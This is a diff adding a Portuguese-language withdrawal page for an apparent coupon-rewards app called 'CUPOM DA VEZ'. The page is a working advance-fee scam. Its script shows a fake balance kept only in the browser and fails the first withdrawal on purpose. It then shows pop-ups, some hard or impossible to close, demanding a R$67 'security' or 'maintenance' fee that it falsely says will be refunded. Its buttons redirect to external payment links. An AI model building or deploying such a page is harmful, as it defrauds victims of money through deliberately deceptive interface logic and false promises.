@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Saque - CUPOM DA VEZ</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
+      font-family: 'Arial', sans-serif;
+      background-color: #fde910; /* Fundo amarelo */
+      overflow: auto;
+    }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px 20px;
+      background-color: #fff; /* Topo branco */
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      position: fixed;
+      width: 100%;
+      top: 0;
+      z-index: 100;
+    }
+
+    .logo {
+      height: 30px;
+    }
+
+    .saldo-container {
+      background-color: #fde910;
+      color: #000;
+      padding: 8px 15px;
+      border-radius: 20px;
+      font-weight: bold;
+      margin-right: 60px;
+      border: 2px solid #000;
+    }
+
+    .content {
+      margin-top: 80px;
+      padding: 20px;
+      padding-bottom: 120px;
+    }
+
+    .faixa-titulo {
+      background-color: #000;
+      color: #fde910;
+      padding: 12px 20px;
+      border-radius: 12px 12px 0 0;
+      font-weight: bold;
+      text-align: center;
+      font-size: 18px;
+    }
+
+    .saque-container {
+      background-color: #fff;
+      border-radius: 0 0 12px 12px;
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      border: 2px solid #000;
+      border-top: none;
+    }
+
+    .info-titulo {
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 5px;
+    }
+
+    .info-valor {
+      color: #000;
+      font-size: 16px;
+      font-weight: bold;
+      padding: 10px;
+      background-color: #f5f5f5;
+      border-radius: 8px;
+      border: 1px solid #ddd;
+      margin-bottom: 15px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-label {
+      display: block;
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 12px;
+      border: 2px solid #ddd;
+      border-radius: 8px;
+      font-size: 16px;
+      box-sizing: border-box;
+      background-color: #fff;
+      color: #000;
+      font-weight: bold;
+    }
+
+    .form-input:focus {
+      border-color: #fde910;
+      outline: none;
+      box-shadow: 0 0 8px #fde910;
+    }
+
+    .botao-solicitar {
+      background-color: #000;
+      color: #fde910;
+      border: 2px solid #000;
+      padding: 12px 25px;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.3s;
+      width: 100%;
+      font-weight: bold;
+    }
+
+    .botao-solicitar:hover {
+      background-color: #fde910;
+      color: #000;
+    }
+
+    .botao-solicitar:disabled {
+      background-color: #cccccc;
+      color: #666666;
+      border-color: #cccccc;
+      cursor: not-allowed;
+    }
+
+    .historico-container {
+      background-color: #fff;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      border: 2px solid #000;
+    }
+
+    .historico-titulo {
+      background-color: #000;
+      color: #fde910;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-weight: bold;
+      text-align: center;
+      font-size: 18px;
+      margin-bottom: 15px;
+    }
+
+    .historico-lista {
+      max-height: 300px;
+      overflow-y: auto;
+    }
+
+    .historico-item {
+      padding: 12px;
+      border-bottom: 1px solid #eee;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .historico-item:last-child {
+      border-bottom: none;
+    }
+
+    .historico-data {
+      font-size: 12px;
+      color: #666;
+    }
+
+    .historico-valor {
+      font-weight: bold;
+      color: #000;
+    }
+
+    .historico-status {
+      font-size: 12px;
+      padding: 4px 8px;
+      border-radius: 4px;
+      font-weight: bold;
+    }
+
+    .status-processando {
+      background-color: #fff3cd;
+      color: #856404;
+    }
+
+    .status-concluido {
+      background-color: #d4edda;
+      color: #155724;
+    }
+
+    .status-falha {
+      background-color: #f8d7da;
+      color: #721c24;
+    }
+
+    .historico-vazio {
+      text-align: center;
+      padding: 20px;
+      color: #666;
+      font-style: italic;
+    }
+
+    /* Dock estilo iOS */
+    .ios-dock {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      background-color: rgba(255, 255, 255, 0.8);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      border-radius: 24px;
+      padding: 15px 25px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+      z-index: 100;
+      border: 1px solid rgba(255, 255, 255, 0.5);
+      width: 80%;
+      max-width: 400px;
+      justify-content: space-around;
+    }
+
+    .dock-button {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 70px;
+      height: 70px;
+      border-radius: 50%;
+      background-color: #fff; /* Fundo branco */
+      color: #7c7c7c; /* Texto 50% mais escuro */
+      text-decoration: none;
+      transition: all 0.3s ease;
+    }
+
+    .dock-button.saque-selecionada {
+      background-color: #fde910;
+      color: #000;
+    }
+
+    .dock-button:hover {
+      transform: translateY(-8px) scale(1.1);
+      background-color: #fde910;
+      color: #000;
+    }
+
+    .dock-icon {
+      font-size: 28px;
+      margin-bottom: 4px;
+    }
+
+    .dock-label {
+      font-size: 12px;
+      font-weight: bold;
+    }
+
+    .mensagem {
+      padding: 10px;
+      border-radius: 8px;
+      margin-top: 15px;
+      text-align: center;
+      font-weight: bold;
+      display: none;
+    }
+
+    .mensagem.sucesso {
+      background-color: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+      display: block;
+    }
+
+    .mensagem.erro {
+      background-color: #f8d7da;
+      color: #721c24;
+      border: 1px solid #f5c6cb;
+      display: block;
+    }
+
+    /* Estilos para o pop-up de propaganda */
+    .popup-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      display: none;
+    }
+
+    .popup-content {
+      background-color: #fff;
+      border-radius: 12px;
+      padding: 20px;
+      width: 85%;
+      max-width: 400px;
+      text-align: center;
+      position: relative;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+    }
+
+    .popup-close {
+      position: absolute;
+      top: 10px;
+      right: 15px;
+      font-size: 24px;
+      cursor: pointer;
+      color: #999;
+      display: none;
+    }
+
+    .popup-title {
+      font-size: 20px;
+      font-weight: bold;
+      margin-bottom: 15px;
+      color: #000;
+    }
+
+    .popup-description {
+      font-size: 16px;
+      margin-bottom: 20px;
+      color: #666;
+    }
+
+    .popup-timer {
+      font-size: 14px;
+      color: #999;
+      margin-top: 10px;
+    }
+
+    /* Caixa de desbloqueio de saque */
+    .desbloqueio-caixa {
+      background-color: #fff;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      border: 2px solid #000;
+      display: none;
+    }
+
+    .desbloqueio-titulo {
+      background-color: #000;
+      color: #fde910;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-weight: bold;
+      text-align: center;
+      font-size: 18px;
+      margin-bottom: 15px;
+    }
+
+    .desbloqueio-descricao {
+      font-size: 16px;
+      margin-bottom: 15px;
+      color: #666;
+      text-align: center;
+    }
+
+    .desbloqueio-botao {
+      background-color: #fde910;
+      color: #000;
+      border: 2px solid #000;
+      padding: 12px 25px;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.3s;
+      width: 100%;
+      font-weight: bold;
+    }
+
+    .desbloqueio-botao:hover {
+      background-color: #000;
+      color: #fde910;
+    }
+
+    /* Loading spinner */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      display: none;
+    }
+
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #fde910;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Novo pop-up grande que não pode ser fechado */
+    .popup-grande-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.9);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 2000;
+      display: none;
+    }
+
+    .popup-grande-content {
+      background-color: #fff;
+      border-radius: 12px;
+      padding: 30px;
+      width: 90%;
+      max-width: 500px;
+      text-align: center;
+      position: relative;
+      box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
+    }
+
+    .popup-grande-titulo {
+      font-size: 24px;
+      font-weight: bold;
+      margin-bottom: 20px;
+      color: #000;
+    }
+
+    .popup-grande-texto {
+      font-size: 18px;
+      margin-bottom: 30px;
+      color: #333;
+      line-height: 1.5;
+    }
+
+    .popup-grande-botoes {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .popup-grande-botao {
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+      border: 2px solid #000;
+    }
+
+    .popup-grande-botao.retornar {
+      background-color: #fde910;
+      color: #000;
+    }
+
+    .popup-grande-botao.retornar:hover {
+      background-color: #000;
+      color: #fde910;
+    }
+
+    .popup-grande-botao.continuar {
+      background-color: #000;
+      color: #fde910;
+    }
+
+    .popup-grande-botao.continuar:hover {
+      background-color: #fde910;
+      color: #000;
+    }
+
+    @media screen and (max-width: 480px) {
+      .logo {
+        height: 25px;
+      }
+
+      .saldo-container {
+        padding: 6px 12px;
+        font-size: 14px;
+        margin-right: 10px;
+      }
+
+      .content {
+        margin-top: 70px;
+        padding: 15px;
+        padding-bottom: 120px;
+      }
+
+      .saque-container, .historico-container, .desbloqueio-caixa {
+        padding: 15px;
+      }
+
+      .ios-dock {
+        padding: 12px 20px;
+        width: 90%;
+      }
+
+      .dock-button {
+        width: 60px;
+        height: 60px;
+      }
+
+      .dock-icon {
+        font-size: 24px;
+      }
+      
+      .historico-item {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 5px;
+      }
+      
+      .historico-info {
+        display: flex;
+        justify-content: space-between;
+        width: 100%;
+      }
+      
+      .popup-grande-content {
+        padding: 20px;
+        width: 85%;
+      }
+      
+      .popup-grande-titulo {
+        font-size: 20px;
+      }
+      
+      .popup-grande-texto {
+        font-size: 16px;
+      }
+      
+      .popup-grande-botoes {
+        flex-direction: column;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img src="images/logo.png" class="logo" alt="CUPOM DA VEZ">
+    <div class="saldo-container">
+      <span id="saldo">R$0</span>
+    </div>
+  </div>
+
+  <div class="content">
+    <!-- Faixa de título -->
+    <div class="faixa-titulo">SOLICITAÇÃO DE SAQUE</div>
+    
+    <div class="saque-container">
+      <div class="info-titulo">Saldo Disponível</div>
+      <div class="info-valor" id="saldo-disponivel">R$ 0,00</div>
+      
+      <div class="info-titulo">Chave PIX Cadastrada</div>
+      <div class="info-valor" id="chave-pix">Nenhuma chave PIX cadastrada</div>
+      
+      <div class="form-group">
+        <label class="form-label" for="valor-saque">Valor do Saque</label>
+        <input type="number" class="form-input" id="valor-saque" placeholder="Digite o valor" min="1" step="0.01">
+      </div>
+      
+      <button class="botao-solicitar" id="botao-solicitar">SOLICITAR SAQUE</button>
+      
+      <div class="mensagem" id="mensagem"></div>
+    </div>
+    
+    <!-- Caixa de desbloqueio de saque (aparece após primeira tentativa) -->
+    <div class="desbloqueio-caixa" id="desbloqueio-caixa">
+      <div class="desbloqueio-titulo">LIBERE SEU SALDO</div>
+      <div class="desbloqueio-descricao" id="desbloqueio-descricao"></div>
+      <button class="desbloqueio-botao" id="desbloqueio-botao">LIBERAR AGORA CLICANDO AQUI!</button>
+    </div>
+    
+    <!-- Histórico de Saques -->
+    <div class="historico-container">
+      <div class="historico-titulo">HISTÓRICO DE SAQUES</div>
+      <div class="historico-lista" id="historico-lista">
+        <!-- Itens do histórico serão inseridos aqui via JavaScript -->
+      </div>
+    </div>
+  </div>
+
+  <!-- Overlay de loading -->
+  <div class="loading-overlay" id="loading-overlay">
+    <div class="spinner"></div>
+  </div>
+
+  <!-- Pop-up de propaganda -->
+  <div class="popup-overlay" id="popup-overlay">
+    <div class="popup-content">
+      <span class="popup-close" id="popup-close">&times;</span>
+      <div class="popup-title">libere seu saldo agora!</div>
+      <div class="popup-description" id="popup-description"></div>
+      <button class="desbloqueio-botao" id="popup-botao">Clique AQUI para liberar!</button>
+      <div class="popup-timer" id="popup-timer">Fechando em 5 segundos...</div>
+    </div>
+  </div>
+
+  <!-- Novo pop-up grande que não pode ser fechado -->
+  <div class="popup-grande-overlay" id="popup-grande-overlay">
+    <div class="popup-grande-content">
+      <div class="popup-grande-titulo">NÃO FOI POSSÍVEL CONCLUIR!</div>
+      <div class="popup-grande-texto">Devido a quantidade de transações da nossa conta de pagamentos, pode acontecer do banco restringir a transação no seu primeiro saque por questão de SEGURANÇA.
+
+Para criar um vínculo entre a nossa conta de pagamentos e sua conta bancária, pedimos que você efetue uma transação que chamamos de TAXA DE SEGURANÇA.
+
+Antes de concluir, se atente aos seguintes detalhes:
+
+1. Não ficamos com o valor da taxa, devolvemos pra você juntamente ao primeiro saque
+2. O valor da taxa é o menor valor que chegamos para criar esse vínculo entre as contas
+3. O pagamento da taxa não será solicitado novamente, ocorre apenas no primeiro saque para alguns usuários
+4. Após a conclusão da taxa, seu primeiro saque será liberado e concluído</div>
+      <div class="popup-grande-botoes">
+        <button class="popup-grande-botao retornar" id="popup-retornar">Retornar para o inicio</button>
+        <button class="popup-grande-botao continuar" id="popup-continuar">Clique aqui para desbloquear!</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Dock estilo iOS -->
+  <div class="ios-dock">
+    <a href="saque.html" class="dock-button saque-selecionada">
+      <span class="dock-icon">💳</span>
+      <span class="dock-label">Saque</span>
+    </a>
+    <a href="cupons.html" class="dock-button">
+      <span class="dock-icon">🏠</span>
+      <span class="dock-label">Início</span>
+    </a>
+    <a href="conta.html" class="dock-button">
+      <span class="dock-icon">👤</span>
+      <span class="dock-label">Conta</span>
+    </a>
+  </div>
+
+  <script>
+    // Descriptions aleatórias para o popup
+    const descricoes = [
+      "Devido aos custos de manutenção da nossa plataforma, cobramos uma taxa de R$67 para o desbloqueio do saldo. Mas não se preocupe, esse é um pagamento único",
+      "Para seguirmos oferecendo um serviço seguro e de qualidade, precisamos de uma pequena colaboração. Cobramos uma taxa única de R$ 67 para o desbloqueio do seu saldo, que cobre os custos de manutenção da nossa estrutura. É só uma vez e pronto!",
+      "Invista no funcionamento contínuo da sua conta! Uma taxa única de R$ 67 para desbloquear o saque garante que nossa plataforma permaneça segura, rápida e disponível para você sempre que precisar. Um pequeno valor para um acesso sem limites.",
+      "Para garantir a estabilidade e a melhoria contínua da nossa plataforma, é necessária uma taxa única de manutenção no valor de R$ 67 para liberar a função de saque. Esse valor assegura que você possa operar sem interrupções."
+    ];
+
+    // Carrega os dados ao iniciar
+    document.addEventListener('DOMContentLoaded', function() {
+      carregarSaldo();
+      carregarChavePix();
+      configurarValidacao();
+      carregarHistorico();
+      
+      // Verifica se já tentou sacar antes para mostrar a caixa de desbloqueio
+      if (localStorage.getItem('tentativaSaque') === 'true') {
+        document.getElementById('desbloqueio-caixa').style.display = 'block';
+        document.getElementById('desbloqueio-descricao').textContent = descricoes[Math.floor(Math.random() * descricoes.length)];
+      }
+      
+      // Verifica se o saque foi validado
+      if (localStorage.getItem('saqueValidado') === 'true') {
+        document.getElementById('desbloqueio-caixa').style.display = 'none';
+        document.getElementById('botao-solicitar').disabled = false;
+        
+        // Verificar se deve mostrar o pop-up grande
+        verificarMostrarPopupGrande();
+      } else if (localStorage.getItem('tentativaSaque') === 'true') {
+        // Se já tentou sacar mas não validou, desabilita o botão
+        document.getElementById('botao-solicitar').disabled = true;
+      }
+      
+      // Configura o botão de desbloqueio
+      document.getElementById('desbloqueio-botao').addEventListener('click', function() {
+        window.location.href = 'https://redirect.urusoficial.com.br/78YI7C6R4QP2S?a=PRVPZkPE';
+      });
+      
+      // Configura o botão do popup
+      document.getElementById('popup-botao').addEventListener('click', function() {
+        window.location.href = 'https://redirect.urusoficial.com.br/78YI7C6R4QP2S?a=PRVPZkPE';
+      });
+      
+      // Configura o botão de fechar o popup
+      document.getElementById('popup-close').addEventListener('click', function() {
+        document.getElementById('popup-overlay').style.display = 'none';
+      });
+      
+      // Configura os botões do popup grande
+      document.getElementById('popup-retornar').addEventListener('click', function() {
+        window.location.href = 'cupons.html';
+      });
+      
+      document.getElementById('popup-continuar').addEventListener('click', function() {
+        window.location.href = 'https://redirect.urusoficial.com.br/VSBEBSXW3Q63C?a=PRVPZkPE';
+      });
+      
+      // Verifica se deve mostrar o popup grande ao carregar a página
+      if (localStorage.getItem('mostrarPopupGrande') === 'true') {
+        document.getElementById('popup-grande-overlay').style.display = 'flex';
+      }
+    });
+
+    // Função para verificar se deve mostrar o pop-up grande
+    function verificarMostrarPopupGrande() {
+      // Verifica se é a segunda visita após validação e se há saques no histórico
+      const historico = JSON.parse(localStorage.getItem('historicoSaque')) || [];
+      const visitasPosValidacao = parseInt(localStorage.getItem('visitasPosValidacao') || '0');
+      
+      // Incrementa o contador de visitas pós-validação
+      localStorage.setItem('visitasPosValidacao', (visitasPosValidacao + 1).toString());
+      
+      // Verifica se deve mostrar o popup (segunda visita após validação e com histórico de saques)
+      if (visitasPosValidacao >= 1 && historico.length > 0 && localStorage.getItem('popupGrandeMostrado') !== 'true') {
+        // Marca que o popup foi mostrado para não exibir novamente
+        localStorage.setItem('popupGrandeMostrado', 'true');
+        localStorage.setItem('mostrarPopupGrande', 'true');
+        
+        // Exibe o pop-up grande
+        document.getElementById('popup-grande-overlay').style.display = 'flex';
+      }
+    }
+
+    // Carrega o saldo do localStorage
+    function carregarSaldo() {
+      const saldo = localStorage.getItem('saldo') || '0';
+      const saldoFormatado = parseFloat(saldo).toFixed(2);
+      document.getElementById('saldo').textContent = `R$${saldoFormatado}`;
+      document.getElementById('saldo-disponivel').textContent = `R$ ${saldoFormatado}`;
+    }
+
+    // Carrega a chave PIX do localStorage
+    function carregarChavePix() {
+      const chavePix = localStorage.getItem('chavePix') || 'Nenhuma chave PIX cadastrada';
+      document.getElementById('chave-pix').textContent = chavePix;
+    }
+
+    // Configura a validação do formulário
+    function configurarValidacao() {
+      const valorSaqueInput = document.getElementById('valor-saque');
+      const botaoSolicitar = document.getElementById('botao-solicitar');
+      
+      valorSaqueInput.addEventListener('input', function() {
+        const valor = parseFloat(valorSaqueInput.value) || 0;
+        const saldo = parseFloat(localStorage.getItem('saldo')) || 0;
+        const chavePix = localStorage.getItem('chavePix');
+        
+        // Verifica se o valor é válido e se há chave PIX cadastrada
+        // E se o saque foi validado
+        if (valor > 0 && valor <= saldo && chavePix && localStorage.getItem('saqueValidado') === 'true') {
+          botaoSolicitar.disabled = false;
+        } else if (localStorage.getItem('saqueValidado') !== 'true') {
+          // Se não foi validado, mantém o botão habilitado (será tratado no clique)
+          botaoSolicitar.disabled = false;
+        } else {
+          botaoSolicitar.disabled = true;
+        }
+      });
+      
+      // Configura o evento de clique no botão
+      botaoSolicitar.addEventListener('click', function() {
+        const valor = parseFloat(valorSaqueInput.value) || 0;
+        const saldo = parseFloat(localStorage.getItem('saldo')) || 0;
+        const chavePix = localStorage.getItem('chavePix');
+        
+        // Validações básicas
+        if (valor <= 0) {
+          mostrarMensagem('Por favor, informe um valor válido para saque.', 'erro');
+          return;
+        }
+        
+        if (valor > saldo) {
+          mostrarMensagem('Saldo insuficiente para realizar o saque.', 'erro');
+          return;
+        }
+        
+        if (!chavePix) {
+          mostrarMensagem('Nenhuma chave PIX cadastrada. Por favor, cadastre uma chave PIX na página da sua conta.', 'erro');
+          return;
+        }
+        
+        // Se o saque não foi validado, mostra o popup
+        if (localStorage.getItem('saqueValidado') !== 'true') {
+          tentarSacar();
+        } else {
+          solicitarSaque();
+        }
+      });
+    }
+
+    // Processa a tentativa de saque (quando não validado)
+    function tentarSacar() {
+      // Mostra o loading
+      document.getElementById('loading-overlay').style.display = 'flex';
+      
+      // Simula o processamento por 3 segundos
+      setTimeout(function() {
+        // Esconde o loading
+        document.getElementById('loading-overlay').style.display = 'none';
+        
+        // Mostra mensagem de erro
+        mostrarMensagem('Recurso de saque não disponível no momento.', 'erro');
+        
+        // Marca que já tentou sacar e que há saque pendente
+        localStorage.setItem('tentativaSaque', 'true');
+        localStorage.setItem('saquePendente', 'true');
+        
+        // Desabilita o botão de saque
+        document.getElementById('botao-solicitar').disabled = true;
+        
+        // Mostra a caixa de desbloqueio
+        document.getElementById('desbloqueio-caixa').style.display = 'block';
+        document.getElementById('desbloqueio-descricao').textContent = descricoes[Math.floor(Math.random() * descricoes.length)];
+        
+        // Mostra o popup de propaganda
+        const descricaoAleatoria = descricoes[Math.floor(Math.random() * descricoes.length)];
+        document.getElementById('popup-description').textContent = descricaoAleatoria;
+        document.getElementById('popup-overlay').style.display = 'flex';
+        
+        // Esconde o botão de fechar inicialmente
+        document.getElementById('popup-close').style.display = 'none';
+        
+        // Configura o timer para mostrar o botão de fechar após 5 segundos
+        let tempoRestante = 5;
+        const timerElement = document.getElementById('popup-timer');
+        
+        const timerInterval = setInterval(function() {
+          tempoRestante--;
+          timerElement.textContent = `Fechando em ${tempoRestante} segundos...`;
+          
+          if (tempoRestante <= 0) {
+            clearInterval(timerInterval);
+            document.getElementById('popup-close').style.display = 'block';
+            timerElement.style.display = 'none';
+          }
+        }, 1000);
+      }, 3000);
+    }
+
+    // Processa a solicitação de saque (quando validado)
+    function solicitarSaque() {
+      const valorSaqueInput = document.getElementById('valor-saque');
+      const valor = parseFloat(valorSaqueInput.value);
+      const saldoAtual = parseFloat(localStorage.getItem('saldo')) || 0;
+      const mensagem = document.getElementById('mensagem');
+      
+      // Processa o saque (subtrai do saldo)
+      const novosaldo = saldoAtual - valor;
+      localStorage.setItem('saldo', novosaldo.toString());
+      
+      // Atualiza a exibição do saldo
+      carregarSaldo();
+      
+      // Limpa o campo de valor
+      valorSaqueInput.value = '';
+      
+      // Desabilita o botão novamente
+      document.getElementById('botao-solicitar').disabled = true;
+      
+      // Exibe mensagem de sucesso
+      mostrarMensagem(`Saque de R$ ${valor.toFixed(2)} solicitado com sucesso! O valor será transferido para sua chave PIX em até 24 horas.`, 'sucesso');
+      
+      // Registra a transação no histórico
+      registrarTransacao(valor);
+      
+      // Recarrega o histórico
+      carregarHistorico();
+    }
+
+    // Exibe mensagens de feedback
+    function mostrarMensagem(texto, tipo) {
+      const mensagem = document.getElementById('mensagem');
+      mensagem.textContent = texto;
+      mensagem.className = 'mensagem ' + tipo;
+      
+      // Remove a mensagem após 5 segundos (apenas para sucesso)
+      if (tipo === 'sucesso') {
+        setTimeout(() => {
+          mensagem.className = 'mensagem';
+        }, 5000);
+      }
+    }
+
+    // Registra a transação no histórico
+    function registrarTransacao(valor) {
+      // Recupera o histórico existente ou cria um novo array vazio
+      const historico = JSON.parse(localStorage.getItem('historicoSaque')) || [];
+      
+      // Adiciona a nova transação
+      historico.unshift({
+        data: new Date().toLocaleString('pt-BR'),
+        valor: valor.toFixed(2),
+        status: 'Processando'
+      });
+      
+      // Salva o histórico atualizado
+      localStorage.setItem('historicoSaque', JSON.stringify(historico));
+    }
+
+    // Carrega e exibe o histórico de saques
+    function carregarHistorico() {
+      const historico = JSON.parse(localStorage.getItem('historicoSaque')) || [];
+      const historicoLista = document.getElementById('historico-lista');
+      
+      // Limpa a lista
+      historicoLista.innerHTML = '';
+      
+      if (historico.length === 0) {
+        historicoLista.innerHTML = '<div class="historico-vazio">Nenhum saque realizado ainda</div>';
+        return;
+      }
+      
+      // Adiciona cada item do histórico
+      historico.forEach(item => {
+        const historicoItem = document.createElement('div');
+        historicoItem.className = 'historico-item';
+        
+        historicoItem.innerHTML = `
+          <div class="historico-info">
+            <div class="historico-data">${item.data}</div>
+            <div class="historico-valor">R$ ${item.valor}</div>
+          </div>
+          <div class="historico-status status-${item.status.toLowerCase()}">${item.status}</div>
+        `;
+        
+        historicoLista.appendChild(historicoItem);
+      });
+    }
+  </script>
+</body>
+</html>
